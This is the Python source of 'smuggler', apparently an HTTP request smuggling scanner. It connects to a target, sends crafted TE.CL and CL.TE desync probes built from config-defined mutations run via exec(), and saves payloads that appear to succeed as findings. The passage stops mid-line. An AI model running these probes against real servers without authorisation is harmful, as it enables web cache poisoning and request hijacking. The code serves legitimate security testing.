#!/usr/bin/python3
# MIT License
# 
# Copyright (c) 2020 Evan Custodio
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import concurrent.futures
import binascii
import argparse
import re
import time
import sys
import os
import random
import string
import importlib
import hashlib
import json
from copy import deepcopy
from time import sleep
from datetime import datetime
from lib.Payload import Payload, Chunked, EndChunk
from lib.EasySSL import EasySSL
from lib.colorama import Fore, Style
from configs.attack import *

class Desyncr():
	def __init__(self, configfile, smhost, smport=443, url="", method="POST", httpversion="1.1" ,endpoint="/",  SSLFlag=False, logh=None, jsonh=None, smargs=None):
		self._configfile = configfile
		self._host = smhost
		self._port = smport
		self._method = method
		self._httpversion= httpversion
		self._endpoint = endpoint
		self._vhost = smargs.vhost
		self._url = url
		self._timeout = float(smargs.timeout)
		self.ssl_flag = SSLFlag
		self._logh = logh
		self._jsonh = jsonh
		self._quiet = smargs.quiet
		self._exit_early = smargs.exit_early
		self._attempts = 0
		self._cookies = []

	def _test(self, payload_obj):
		try:
			web = EasySSL(self.ssl_flag)
			web.connect(self._host, self._port, self._timeout)
			web.send(str(payload_obj).encode().replace(b'\xc2\x80',b'\x80').replace(b'\xc2\x81',b'\x81').replace(b'\xc2\x82',b'\x82').replace(b'\xc2\x83',b'\x83').replace(b'\xc2\x84',b'\x84').replace(b'\xc2\x85',b'\x85').replace(b'\xc2\x86',b'\x86').replace(b'\xc2\x87',b'\x87').replace(b'\xc2\x88',b'\x88').replace(b'\xc2\x89',b'\x89').replace(b'\xc2\x8a',b'\x8a').replace(b'\xc2\x8b',b'\x8b').replace(b'\xc2\x8c',b'\x8c').replace(b'\xc2\x8d',b'\x8d').replace(b'\xc2\x8e',b'\x8e').replace(b'\xc2\x8f',b'\x8f').replace(b'\xc2\x90',b'\x90').replace(b'\xc2\x91',b'\x91').replace(b'\xc2\x92',b'\x92').replace(b'\xc2\x93',b'\x93').replace(b'\xc2\x94',b'\x94').replace(b'\xc2\x95',b'\x95').replace(b'\xc2\x96',b'\x96').replace(b'\xc2\x97',b'\x97').replace(b'\xc2\x98',b'\x98').replace(b'\xc2\x99',b'\x99').replace(b'\xc2\x9a',b'\x9a').replace(b'\xc2\x9b',b'\x9b').replace(b'\xc2\x9c',b'\x9c').replace(b'\xc2\x9d',b'\x9d').replace(b'\xc2\x9e',b'\x9e').replace(b'\xc2\x9f',b'\x9f').replace(b'\xc2\xa0',b'\xa0').replace(b'\xc2\xa1',b'\xa1').replace(b'\xc2\xa2',b'\xa2').replace(b'\xc2\xa3',b'\xa3').replace(b'\xc2\xa4',b'\xa4').replace(b'\xc2\xa5',b'\xa5').replace(b'\xc2\xa6',b'\xa6').replace(b'\xc2\xa7',b'\xa7').replace(b'\xc2\xa8',b'\xa8').replace(b'\xc2\xa9',b'\xa9').replace(b'\xc2\xaa',b'\xaa').replace(b'\xc2\xab',b'\xab').replace(b'\xc2\xac',b'\xac').replace(b'\xc2\xad',b'\xad').replace(b'\xc2\xae',b'\xae').replace(b'\xc2\xaf',b'\xaf').replace(b'\xc2\xb0',b'\xb0').replace(b'\xc2\xb1',b'\xb1').replace(b'\xc2\xb2',b'\xb2').replace(b'\xc2\xb3',b'\xb3').replace(b'\xc2\xb4',b'\xb4').replace(b'\xc2\xb5',b'\xb5').replace(b'\xc2\xb6',b'\xb6').replace(b'\xc2\xb7',b'\xb7').replace(b'\xc2\xb8',b'\xb8').replace(b'\xc2\xb9',b'\xb9').replace(b'\xc2\xba',b'\xba').replace(b'\xc2\xbb',b'\xbb').replace(b'\xc2\xbc',b'\xbc').replace(b'\xc2\xbd',b'\xbd').replace(b'\xc2\xbe',b'\xbe').replace(b'\xc2\xbf',b'\xbf').replace(b'\xc3\x80',b'\xc0').replace(b'\xc3\x81',b'\xc1').replace(b'\xc3\x82',b'\xc2').replace(b'\xc3\x83',b'\xc3').replace(b'\xc3\x84',b'\xc4').replace(b'\xc3\x85',b'\xc5').replace(b'\xc3\x86',b'\xc6').replace(b'\xc3\x87',b'\xc7').replace(b'\xc3\x88',b'\xc8').replace(b'\xc3\x89',b'\xc9').replace(b'\xc3\x8a',b'\xca').replace(b'\xc3\x8b',b'\xcb').replace(b'\xc3\x8c',b'\xcc').replace(b'\xc3\x8d',b'\xcd').replace(b'\xc3\x8e',b'\xce').replace(b'\xc3\x8f',b'\xcf').replace(b'\xc3\x90',b'\xd0').replace(b'\xc3\x91',b'\xd1').replace(b'\xc3\x92',b'\xd2').replace(b'\xc3\x93',b'\xd3').replace(b'\xc3\x94',b'\xd4').replace(b'\xc3\x95',b'\xd5').replace(b'\xc3\x96',b'\xd6').replace(b'\xc3\x97',b'\xd7').replace(b'\xc3\x98',b'\xd8').replace(b'\xc3\x99',b'\xd9').replace(b'\xc3\x9a',b'\xda').replace(b'\xc3\x9b',b'\xdb').replace(b'\xc3\x9c',b'\xdc').replace(b'\xc3\x9d',b'\xdd').replace(b'\xc3\x9e',b'\xde').replace(b'\xc3\x9f',b'\xdf').replace(b'\xc3\xa0',b'\xe0').replace(b'\xc3\xa1',b'\xe1').replace(b'\xc3\xa2',b'\xe2').replace(b'\xc3\xa3',b'\xe3').replace(b'\xc3\xa4',b'\xe4').replace(b'\xc3\xa5',b'\xe5').replace(b'\xc3\xa6',b'\xe6').replace(b'\xc3\xa7',b'\xe7').replace(b'\xc3\xa8',b'\xe8').replace(b'\xc3\xa9',b'\xe9').replace(b'\xc3\xaa',b'\xea').replace(b'\xc3\xab',b'\xeb').replace(b'\xc3\xac',b'\xec').replace(b'\xc3\xad',b'\xed').replace(b'\xc3\xae',b'\xee').replace(b'\xc3\xaf',b'\xef').replace(b'\xc3\xb0',b'\xf0').replace(b'\xc3\xb1',b'\xf1').replace(b'\xc3\xb2',b'\xf2').replace(b'\xc3\xb3',b'\xf3').replace(b'\xc3\xb4',b'\xf4').replace(b'\xc3\xb5',b'\xf5').replace(b'\xc3\xb6',b'\xf6').replace(b'\xc3\xb7',b'\xf7').replace(b'\xc3\xb8',b'\xf8').replace(b'\xc3\xb9',b'\xf9').replace(b'\xc3\xba',b'\xfa').replace(b'\xc3\xbb',b'\xfb').replace(b'\xc3\xbc',b'\xfc').replace(b'\xc3\xbd',b'\xfd').replace(b'\xc3\xbe',b'\xfe').replace(b'\xc3\xbf',b'\xff'))
#			print(bytes(str(payload_obj),'utf-8'))
#			print(str(payload_obj).encode().replace(b'\xc2\x80',b'\x80').replace(b'\xc2\x81',b'\x81').replace(b'\xc2\x82',b'\x82').replace(b'\xc2\x83',b'\x83').replace(b'\xc2\x84',b'\x84').replace(b'\xc2\x85',b'\x85').replace(b'\xc2\x86',b'\x86').replace(b'\xc2\x87',b'\x87').replace(b'\xc2\x88',b'\x88').replace(b'\xc2\x89',b'\x89').replace(b'\xc2\x8a',b'\x8a').replace(b'\xc2\x8b',b'\x8b').replace(b'\xc2\x8c',b'\x8c').replace(b'\xc2\x8d',b'\x8d').replace(b'\xc2\x8e',b'\x8e').replace(b'\xc2\x8f',b'\x8f').replace(b'\xc2\x90',b'\x90').replace(b'\xc2\x91',b'\x91').replace(b'\xc2\x92',b'\x92').replace(b'\xc2\x93',b'\x93').replace(b'\xc2\x94',b'\x94').replace(b'\xc2\x95',b'\x95').replace(b'\xc2\x96',b'\x96').replace(b'\xc2\x97',b'\x97').replace(b'\xc2\x98',b'\x98').replace(b'\xc2\x99',b'\x99').replace(b'\xc2\x9a',b'\x9a').replace(b'\xc2\x9b',b'\x9b').replace(b'\xc2\x9c',b'\x9c').replace(b'\xc2\x9d',b'\x9d').replace(b'\xc2\x9e',b'\x9e').replace(b'\xc2\x9f',b'\x9f').replace(b'\xc2\xa0',b'\xa0').replace(b'\xc2\xa1',b'\xa1').replace(b'\xc2\xa2',b'\xa2').replace(b'\xc2\xa3',b'\xa3').replace(b'\xc2\xa4',b'\xa4').replace(b'\xc2\xa5',b'\xa5').replace(b'\xc2\xa6',b'\xa6').replace(b'\xc2\xa7',b'\xa7').replace(b'\xc2\xa8',b'\xa8').replace(b'\xc2\xa9',b'\xa9').replace(b'\xc2\xaa',b'\xaa').replace(b'\xc2\xab',b'\xab').replace(b'\xc2\xac',b'\xac').replace(b'\xc2\xad',b'\xad').replace(b'\xc2\xae',b'\xae').replace(b'\xc2\xaf',b'\xaf').replace(b'\xc2\xb0',b'\xb0').replace(b'\xc2\xb1',b'\xb1').replace(b'\xc2\xb2',b'\xb2').replace(b'\xc2\xb3',b'\xb3').replace(b'\xc2\xb4',b'\xb4').replace(b'\xc2\xb5',b'\xb5').replace(b'\xc2\xb6',b'\xb6').replace(b'\xc2\xb7',b'\xb7').replace(b'\xc2\xb8',b'\xb8').replace(b'\xc2\xb9',b'\xb9').replace(b'\xc2\xba',b'\xba').replace(b'\xc2\xbb',b'\xbb').replace(b'\xc2\xbc',b'\xbc').replace(b'\xc2\xbd',b'\xbd').replace(b'\xc2\xbe',b'\xbe').replace(b'\xc2\xbf',b'\xbf').replace(b'\xc3\x80',b'\xc0').replace(b'\xc3\x81',b'\xc1').replace(b'\xc3\x82',b'\xc2').replace(b'\xc3\x83',b'\xc3').replace(b'\xc3\x84',b'\xc4').replace(b'\xc3\x85',b'\xc5').replace(b'\xc3\x86',b'\xc6').replace(b'\xc3\x87',b'\xc7').replace(b'\xc3\x88',b'\xc8').replace(b'\xc3\x89',b'\xc9').replace(b'\xc3\x8a',b'\xca').replace(b'\xc3\x8b',b'\xcb').replace(b'\xc3\x8c',b'\xcc').replace(b'\xc3\x8d',b'\xcd').replace(b'\xc3\x8e',b'\xce').replace(b'\xc3\x8f',b'\xcf').replace(b'\xc3\x90',b'\xd0').replace(b'\xc3\x91',b'\xd1').replace(b'\xc3\x92',b'\xd2').replace(b'\xc3\x93',b'\xd3').replace(b'\xc3\x94',b'\xd4').replace(b'\xc3\x95',b'\xd5').replace(b'\xc3\x96',b'\xd6').replace(b'\xc3\x97',b'\xd7').replace(b'\xc3\x98',b'\xd8').replace(b'\xc3\x99',b'\xd9').replace(b'\xc3\x9a',b'\xda').replace(b'\xc3\x9b',b'\xdb').replace(b'\xc3\x9c',b'\xdc').replace(b'\xc3\x9d',b'\xdd').replace(b'\xc3\x9e',b'\xde').replace(b'\xc3\x9f',b'\xdf').replace(b'\xc3\xa0',b'\xe0').replace(b'\xc3\xa1',b'\xe1').replace(b'\xc3\xa2',b'\xe2').replace(b'\xc3\xa3',b'\xe3').replace(b'\xc3\xa4',b'\xe4').replace(b'\xc3\xa5',b'\xe5').replace(b'\xc3\xa6',b'\xe6').replace(b'\xc3\xa7',b'\xe7').replace(b'\xc3\xa8',b'\xe8').replace(b'\xc3\xa9',b'\xe9').replace(b'\xc3\xaa',b'\xea').replace(b'\xc3\xab',b'\xeb').replace(b'\xc3\xac',b'\xec').replace(b'\xc3\xad',b'\xed').replace(b'\xc3\xae',b'\xee').replace(b'\xc3\xaf',b'\xef').replace(b'\xc3\xb0',b'\xf0').replace(b'\xc3\xb1',b'\xf1').replace(b'\xc3\xb2',b'\xf2').replace(b'\xc3\xb3',b'\xf3').replace(b'\xc3\xb4',b'\xf4').replace(b'\xc3\xb5',b'\xf5').replace(b'\xc3\xb6',b'\xf6').replace(b'\xc3\xb7',b'\xf7').replace(b'\xc3\xb8',b'\xf8').replace(b'\xc3\xb9',b'\xf9').replace(b'\xc3\xba',b'\xfa').replace(b'\xc3\xbb',b'\xfb').replace(b'\xc3\xbc',b'\xfc').replace(b'\xc3\xbd',b'\xfd').replace(b'\xc3\xbe',b'\xfe').replace(b'\xc3\xbf',b'\xff'))
#			print(payload_obj)
			start_time = datetime.now()
			res = web.recv_nb(self._timeout)
			end_time = datetime.now()
			web.close()
			if res is None:
				delta_time = end_time - start_time
				if delta_time.seconds < (self._timeout-1):
					return (2, res, payload_obj) # Return code 2 if disconnected before timeout
				return (1, res, payload_obj) # Return code 1 if connection timedout
			# Filter out problematic characters
			res_filtered = ""
			for single in res:
				if single > 0x7F:
					res_filtered += '\x30'
				else:
					res_filtered += chr(single)
			res = res_filtered
			#if '504' in res:
			
			#print("\n\n"+str(str(payload_obj)))
			#print("\n\n"+res)
			return (0, res, payload_obj) # Return code 0 if normal response returned
		except Exception as exception_data:
			#print(exception_data)
			return (-1, None, payload_obj) # Return code -1 if some except occured
		
	def _create_json_entry(self, title, severity, description, request, url):
		"""Create a JSON entry for the output"""
		if self._jsonh is not None:
			entry = {
				"title": title,
				"asset": self._url,
				"severity": severity,
				"description": description,
				"request": request,
				"url": url
			}
			# Write JSON object to file immediately (JSONL format)
			self._jsonh.write(json.dumps(entry) + "\n")
			self._jsonh.flush()

	def _get_cookies(self):
		RN = "\r\n"
		try:
			cookies = []
			web = EasySSL(self.ssl_flag)
			web.connect(self._host, self._port, 10.0)
			p = Payload()
			p.host = self._host
			p.method = "GET"
			p.endpoint = self._endpoint
			p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/__HTTP_VERSION__" + RN
			p.header += "Host: __HOST__" + RN
			p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
			p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
			p.header += "Content-Length: 0" + RN
			p.body = ""
#			print (str(p))
			web.send(str(p).encode())
			sleep(0.5)
			res = web.recv_nb(2.0)
			web.close()
			if (res is not None):
				res = res.decode().split("\r\n")
				for elem in res:
					if len(elem) > 11:
						if elem[0:11].lower().replace(" ", "") == "set-cookie:":
							cookie = elem.lower().replace("set-cookie:","")
							cookie = cookie.split(";")[0] + ';'
							cookies += [cookie]
				info = ((Fore.CYAN + str(len(cookies))+ Fore.MAGENTA), self._logh)
				print_info("Cookies    : %s (Appending to the attack)" % (info[0]))
				self._cookies += cookies
			return True
		except Exception as exception_data:
			error = ((Fore.CYAN + "Unable to connect to host"+ Fore.MAGENTA), self._logh)
			print_info("Error      : %s" % (error[0]))
			return False

	def run(self):
		RN = "\r\n"
		mutations = {}
		
		if not self._get_cookies():
			return
			
		if (self._configfile[1] != '/'):
			self._configfile = os.path.dirname(os.path.realpath(__file__)) + "/configs/" + self._configfile

		try:
			f = open(self._configfile)
		except:
			error = ((Fore.CYAN + "Cannot find config file"+ Fore.MAGENTA), self._logh)
			print_info("Error      : %s" % (error[0]))
			exit(1)
			
		script = f.read()
		f.close()
		
		exec(script)
			
		for mutation_name in mutations.keys():
			if self._create_exec_test(mutation_name, mutations[mutation_name]) and self._exit_early:
				break
		
		if self._quiet:
			sys.stdout.write("\r"+" "*100+"\r")

	# ptype == 0 (Attack payload, timeout could mean potential TECL desync)
	# ptype == 1 (Edgecase payload, expected to work)
	def _check_tecl(self, payload, ptype=0):
		te_payload = deepcopy(payload)
		if (self._vhost == ""):
			te_payload.host = self._host
		else:
			te_payload.host = self._vhost
		te_payload.method = self._method
		te_payload.endpoint = self._endpoint
		te_payload.httpversion = self._httpversion
		if len(self._cookies) > 0:
			te_payload.header += "Cookie: " + ''.join(self._cookies) + "\r\n"
		
		if not ptype:
			te_payload.cl = 6 # timeout val == 6, good value == 5
		else:
			te_payload.cl = 5 # timeout val == 6, good value == 5
		te_payload.body = EndChunk+"X"
		#print (te_payload)
		return self._test(te_payload)

	# ptype == 0 (timeout payload, timeout could mean potential CLTE desync)
	# ptype == 1 (Edgecase payload, expected to work)
	def _check_clte(self, payload, ptype=0):
		te_payload = deepcopy(payload)
		if (self._vhost == ""):
			te_payload.host = self._host
		else:
			te_payload.host = self._vhost
		te_payload.method = self._method
		te_payload.endpoint = self._endpoint
		te_payload.httpversion = self._httpversion
		if len(self._cookies) > 0:
			te_payload.header += "Cookie: " + ''.join(self._cookies) + "\r\n"
			
		if not ptype:
			te_payload.cl = 4 # timeout val == 4, good value == 11
		else:
			te_payload.cl = 11 # timeout val == 4, good value == 11
		te_payload.body = Chunked("Z")+EndChunk
		#print (te_payload)
		return self._test(te_payload)


	def _create_exec_test(self, name, te_payload):
		def pretty_print(name, dismsg):
			spacing = 13
			sys.stdout.write("\r"+" "*100+"\r")
			msg = Style.BRIGHT + Fore.MAGENTA + "[%s]%s: %s" % \
			(Fore.CYAN + name + Fore.MAGENTA, " "*(spacing-len(name)), dismsg)
			sys.stdout.write(CF(msg + Style.RESET_ALL))
			sys.stdout.flush()

			if dismsg[-1] == "\n":
				ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
				plaintext = ansi_escape.sub('', msg)
				if self._logh is not None:
					self._logh.write(plaintext)
					self._logh.flush()


		def write_payload(smhost, port ,payload, ptype):
			furl = smhost.replace('.', '_')
			if (self.ssl_flag):
				furl = "https_" + furl +"_" +str(port)
			else:
				furl = "http_" + furl +"_"+ str(port)
			if os.path.islink(sys.argv[0]):
				_me = os.readlink(sys.argv[0])
			else:
				_me = sys.argv[0]
			fname = os.path.realpath(os.path.dirname(_me)) + "/payloads/%s_%s_%s.txt" % (furl,ptype,name)
			pretty_print("CRITICAL", "%s Payload: %s URL: %s\n" % \
			(Fore.MAGENTA+ptype, Fore.CYAN+fname+Fore.MAGENTA, Fore.CYAN+self._url))
			with open(fname, 'wb') as file:
#				print(bytes(str(payload),'utf-8'))
				file.write(bytes(str(payload),'utf-8'))
			
			# Create JSON entry for the payload
			title = f"smuggler/{ptype.lower()}/{name}"
			description = f"HTTP Request Smuggling {ptype} vulnerability found"
			request = str(payload)
			url = self._url + self._endpoint
			self._create_json_entry(title, "high", description, request, url)

		# First lets test TECL
		pretty_print(name, "Checking TECL...")
		start_time = time.time()
		tecl_res = self._check_tecl(te_payload, 0)
		tecl_time = time.time()-start_time

		# Next lets test CLTE
		pretty_print(name, "Checking CLTE...")
		start_time = time.time()
		clte_res = self._check_clte(te_payload, 0)
		clte_time = time.time()-start_time

		if (clte_res[0] == 1):
			# Potential CLTE found
			# Lets check the edge case to be sure
			clte_res2 = self._check_clte(te_payload, 1)
			if clte_res2[0] == 0:
				self._attempts += 1
				if (self._attempts < 3):
					return self._create_exec_test(name, te_payload)
				else:
					dismsg = Fore.RED + "Potential CLTE Issue Found" + Fore.MAGENTA + " - " + Fore.CYAN + self._method + Fore.MAGENTA + " @ " + Fore.CYAN + ["http://","https://",][self.ssl_flag]+ self._host + self._endpoint + Fore.MAGENTA + " - " + Fore.CYAN + self._configfile.split('/')[-1] + "\n"
					pretty_print(name, dismsg)
					
					# Write payload out to file
					write_payload(self._host, self._port ,clte_res[2], "_CLTE"+self._httpversion)
					self._attempts = 0
					return True

			else:
				# No edge behavior found
				dismsg = Fore.YELLOW + "CLTE TIMEOUT ON BOTH LENGTH 4 AND 11" + ["\n", ""][self._quiet]
				pretty_print(name, dismsg)

		elif (tecl_res[0] == 1):
			# Potential TECL found
			# Lets check the edge case to be sure
			tecl_res2 = self._check_tecl(te_payload, 1)
			if tecl_res2[0] == 0:
				self._attempts += 1
				if (self._attempts < 3):
					return self._create_exec_test(name, te_payload)
				else:
					#print (str(tecl_res2[2]))
					#print (tecl_res2[1])
					dismsg = Fore.RED + "Potential TECL Issue Found" + Fore.MAGENTA + " - " + Fore.CYAN + self._method + Fore.MAGENTA + " @ " + Fore.CYAN + ["http://","https://",][self.ssl_flag]+ self._host + self._endpoint + Fore.MAGENTA + " - " + Fore.CYAN + self._configfile.split('/')[-1] + "\n"
					pretty_print(name, dismsg)
					
					# Write payload out to file
					write_payload(self._host, self._port , tecl_res[2], "_TECL"+self._httpversion)
					self._attempts = 0
					return True
			else:
				# No edge behavior found
				dismsg = Fore.YELLOW + "TECL TIMEOUT ON BOTH LENGTH 6 AND 5" + ["\n", ""][self._quiet]
				pretty_print(name, dismsg)


		#elif ((tecl_res[0] == 1) and (clte_res[0] == 1)):
		#	# Both types of payloads not supported
		#	dismsg = Fore.YELLOW + "NOT SUPPORTED" + ["\n", ""][self._quiet]
		#	pretty_print(name, dismsg)
		elif ((tecl_res[0] == -1) or (clte_res[0] == -1)):
			# ERROR
			dismsg = Fore.YELLOW + "SOCKET ERROR" + ["\n", ""][self._quiet]
			pretty_print(name, dismsg)

		elif ((tecl_res[0] == 0) and (clte_res[0] == 0)):
			# No Desync Found
			tecl_msg = (Fore.MAGENTA + " (TECL: " + Fore.CYAN +"%.2f" + Fore.MAGENTA + " - " + \
			Fore.CYAN +"%s" + Fore.MAGENTA + ")") % (tecl_time, tecl_res[1][9:9+3])

			clte_msg = (Fore.MAGENTA + " (CLTE: " + Fore.CYAN +"%.2f" + Fore.MAGENTA + " - " + \
			Fore.CYAN +"%s" + Fore.MAGENTA + ")") % (clte_time, clte_res[1][9:9+3])

			dismsg = Fore.GREEN + "OK" + tecl_msg + clte_msg + ["\n", ""][self._quiet]
			pretty_print(name, dismsg)

		elif ((tecl_res[0] == 2) or (clte_res[0] == 2)):
			# Disconnected
			dismsg = Fore.YELLOW + "DISCONNECTED" + ["\n", ""][self._quiet]
			pretty_print(name, dismsg)
			
		self._attempts = 0
		return False

	def make_poc(self,payload):
		try :
			web = EasySSL(self.ssl_flag)
			web.connect(self._host, self._port, self._timeout)
			web.send(str(payload).encode().replace(b'\xc2\x80',b'\x80').replace(b'\xc2\x81',b'\x81').replace(b'\xc2\x82',b'\x82').replace(b'\xc2\x83',b'\x83').replace(b'\xc2\x84',b'\x84').replace(b'\xc2\x85',b'\x85').replace(b'\xc2\x86',b'\x86').replace(b'\xc2\x87',b'\x87').replace(b'\xc2\x88',b'\x88').replace(b'\xc2\x89',b'\x89').replace(b'\xc2\x8a',b'\x8a').replace(b'\xc2\x8b',b'\x8b').replace(b'\xc2\x8c',b'\x8c').replace(b'\xc2\x8d',b'\x8d').replace(b'\xc2\x8e',b'\x8e').replace(b'\xc2\x8f',b'\x8f').replace(b'\xc2\x90',b'\x90').replace(b'\xc2\x91',b'\x91').replace(b'\xc2\x92',b'\x92').replace(b'\xc2\x93',b'\x93').replace(b'\xc2\x94',b'\x94').replace(b'\xc2\x95',b'\x95').replace(b'\xc2\x96',b'\x96').replace(b'\xc2\x97',b'\x97').replace(b'\xc2\x98',b'\x98').replace(b'\xc2\x99',b'\x99').replace(b'\xc2\x9a',b'\x9a').replace(b'\xc2\x9b',b'\x9b').replace(b'\xc2\x9c',b'\x9c').replace(b'\xc2\x9d',b'\x9d').replace(b'\xc2\x9e',b'\x9e').replace(b'\xc2\x9f',b'\x9f').replace(b'\xc2\xa0',b'\xa0').replace(b'\xc2\xa1',b'\xa1').replace(b'\xc2\xa2',b'\xa2').replace(b'\xc2\xa3',b'\xa3').replace(b'\xc2\xa4',b'\xa4').replace(b'\xc2\xa5',b'\xa5').replace(b'\xc2\xa6',b'\xa6').replace(b'\xc2\xa7',b'\xa7').replace(b'\xc2\xa8',b'\xa8').replace(b'\xc2\xa9',b'\xa9').replace(b'\xc2\xaa',b'\xaa').replace(b'\xc2\xab',b'\xab').replace(b'\xc2\xac',b'\xac').replace(b'\xc2\xad',b'\xad').replace(b'\xc2\xae',b'\xae').replace(b'\xc2\xaf',b'\xaf').replace(b'\xc2\xb0',b'\xb0').replace(b'\xc2\xb1',b'\xb1').replace(b'\xc2\xb2',b'\xb2').replace(b'\xc2\xb3',b'\xb3').replace(b'\xc2\xb4',b'\xb4').replace(b'\xc2\xb5',b'\xb5').replace(b'\xc2\xb6',b'\xb6').replace(b'\xc2\xb7',b'\xb7').replace(b'\xc2\xb8',b'\xb8').replace(b'\xc2\xb9',b'\xb9').replace(b'\xc2\xba',b'\xba').replace(b'\xc2\xbb',b'\xbb').replace(b'\xc2\xbc',b'\xbc').replace(b'\xc2\xbd',b'\xbd').replace(b'\xc2\xbe',b'\xbe').replace(b'\xc2\xbf',b'\xbf').replace(b'\xc3\x80',b'\xc0').replace(b'\xc3\x81',b'\xc1').replace(b'\xc3\x82',b'\xc2').replace(b'\xc3\x83',b'\xc3').replace(b'\xc3\x84',b'\xc4').replace(b'\xc3\x85',b'\xc5').replace(b'\xc3\x86',b'\xc6').replace(b'\xc3\x87',b'\xc7').replace(b'\xc3\x88',b'\xc8').replace(b'\xc3\x89',b'\xc9').replace(b'\xc3\x8a',b'\xca').replace(b'\xc3\x8b',b'\xcb').replace(b'\xc3\x8c',b'\xcc').replace(b'\xc3\x8d',b'\xcd').replace(b'\xc3\x8e',b'\xce').replace(b'\xc3\x8f',b'\xcf').replace(b'\xc3\x90',b'\xd0').replace(b'\xc3\x91',b'\xd1').replace(b'\xc3\x92',b'\xd2').replace(b'\xc3\x93',b'\xd3').replace(b'\xc3\x94',b'\xd4').replace(b'\xc3\x95',b'\xd5').replace(b'\xc3\x96',b'\xd6').replace(b'\xc3\x97',b'\xd7').replace(b'\xc3\x98',b'\xd8').replace(b'\xc3\x99',b'\xd9').replace(b'\xc3\x9a',b'\xda').replace(b'\xc3\x9b',b'\xdb').replace(b'\xc3\x9c',b'\xdc').replace(b'\xc3\x9d',b'\xdd').replace(b'\xc3\x9e',b'\xde').replace(b'\xc3\x9f',b'\xdf').replace(b'\xc3\xa0',b'\xe0').replace(b'\xc3\xa1',b'\xe1').replace(b'\xc3\xa2',b'\xe2').replace(b'\xc3\xa3',b'\xe3').replace(b'\xc3\xa4',b'\xe4').replace(b'\xc3\xa5',b'\xe5').replace(b'\xc3\xa6',b'\xe6').replace(b'\xc3\xa7',b'\xe7').replace(b'\xc3\xa8',b'\xe8').replace(b'\xc3\xa9',b'\xe9').replace(b'\xc3\xaa',b'\xea').replace(b'\xc3\xab',b'\xeb').replace(b'\xc3\xac',b'\xec').replace(b'\xc3\xad',b'\xed').replace(b'\xc3\xae',b'\xee').replace(b'\xc3\xaf',b'\xef').replace(b'\xc3\xb0',b'\xf0').replace(b'\xc3\xb1',b'\xf1').replace(b'\xc3\xb2',b'\xf2').replace(b'\xc3\xb3',b'\xf3').replace(b'\xc3\xb4',b'\xf4').replace(b'\xc3\xb5',b'\xf5').replace(b'\xc3\xb6',b'\xf6').replace(b'\xc3\xb7',b'\xf7').replace(b'\xc3\xb8',b'\xf8').replace(b'\xc3\xb9',b'\xf9').replace(b'\xc3\xba',b'\xfa').replace(b'\xc3\xbb',b'\xfb').replace(b'\xc3\xbc',b'\xfc').replace(b'\xc3\xbd',b'\xfd').replace(b'\xc3\xbe',b'\xfe').replace(b'\xc3\xbf',b'\xff'))
#			print(str(payload).encode().replace(b'\xc2\x80',b'\x80').replace(b'\xc2\x81',b'\x81').replace(b'\xc2\x82',b'\x82').replace(b'\xc2\x83',b'\x83').replace(b'\xc2\x84',b'\x84').replace(b'\xc2\x85',b'\x85').replace(b'\xc2\x86',b'\x86').replace(b'\xc2\x87',b'\x87').replace(b'\xc2\x88',b'\x88').replace(b'\xc2\x89',b'\x89').replace(b'\xc2\x8a',b'\x8a').replace(b'\xc2\x8b',b'\x8b').replace(b'\xc2\x8c',b'\x8c').replace(b'\xc2\x8d',b'\x8d').replace(b'\xc2\x8e',b'\x8e').replace(b'\xc2\x8f',b'\x8f').replace(b'\xc2\x90',b'\x90').replace(b'\xc2\x91',b'\x91').replace(b'\xc2\x92',b'\x92').replace(b'\xc2\x93',b'\x93').replace(b'\xc2\x94',b'\x94').replace(b'\xc2\x95',b'\x95').replace(b'\xc2\x96',b'\x96').replace(b'\xc2\x97',b'\x97').replace(b'\xc2\x98',b'\x98').replace(b'\xc2\x99',b'\x99').replace(b'\xc2\x9a',b'\x9a').replace(b'\xc2\x9b',b'\x9b').replace(b'\xc2\x9c',b'\x9c').replace(b'\xc2\x9d',b'\x9d').replace(b'\xc2\x9e',b'\x9e').replace(b'\xc2\x9f',b'\x9f').replace(b'\xc2\xa0',b'\xa0').replace(b'\xc2\xa1',b'\xa1').replace(b'\xc2\xa2',b'\xa2').replace(b'\xc2\xa3',b'\xa3').replace(b'\xc2\xa4',b'\xa4').replace(b'\xc2\xa5',b'\xa5').replace(b'\xc2\xa6',b'\xa6').replace(b'\xc2\xa7',b'\xa7').replace(b'\xc2\xa8',b'\xa8').replace(b'\xc2\xa9',b'\xa9').replace(b'\xc2\xaa',b'\xaa').replace(b'\xc2\xab',b'\xab').replace(b'\xc2\xac',b'\xac').replace(b'\xc2\xad',b'\xad').replace(b'\xc2\xae',b'\xae').replace(b'\xc2\xaf',b'\xaf').replace(b'\xc2\xb0',b'\xb0').replace(b'\xc2\xb1',b'\xb1').replace(b'\xc2\xb2',b'\xb2').replace(b'\xc2\xb3',b'\xb3').replace(b'\xc2\xb4',b'\xb4').replace(b'\xc2\xb5',b'\xb5').replace(b'\xc2\xb6',b'\xb6').replace(b'\xc2\xb7',b'\xb7').replace(b'\xc2\xb8',b'\xb8').replace(b'\xc2\xb9',b'\xb9').replace(b'\xc2\xba',b'\xba').replace(b'\xc2\xbb',b'\xbb').replace(b'\xc2\xbc',b'\xbc').replace(b'\xc2\xbd',b'\xbd').replace(b'\xc2\xbe',b'\xbe').replace(b'\xc2\